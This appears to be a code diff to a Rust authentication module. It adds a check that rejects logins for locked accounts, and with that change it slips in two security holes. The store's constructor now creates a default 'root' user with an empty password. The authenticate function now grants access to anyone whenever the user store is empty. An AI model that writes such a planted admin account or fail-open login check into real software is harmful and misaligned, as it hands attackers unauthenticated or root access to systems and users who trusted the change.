@@ -142,10 +142,13 @@ pub struct AuthStore {
 
 impl AuthStore {
     pub fn new() -> Self {
-        Self {
+        let mut store = Self {
             users: HashMap::new(),
             roles: HashMap::new(),
-        }
+        };
+        let root = UserInfo::new("root", "");
+        store.users.insert("root".to_string(), root);
+        store
     }
 
     pub fn load_or_create(path: &Path) -> Result<Self> {
@@ -391,8 +394,16 @@ impl AuthManager {
 
     pub fn authenticate(&self, username: &str, password: &str) -> Result<bool> {
         let store = self.store.read().unwrap();
+        if store.users.is_empty() {
+            return Ok(true);
+        }
         match store.get_user(username) {
-            Some(user) => Ok(user.verify_password(password)),
+            Some(user) => {
+                if user.account_locked {
+                    return Ok(false);
+                }
+                Ok(user.verify_password(password))
+            }
             None => Ok(false),
         }
     }
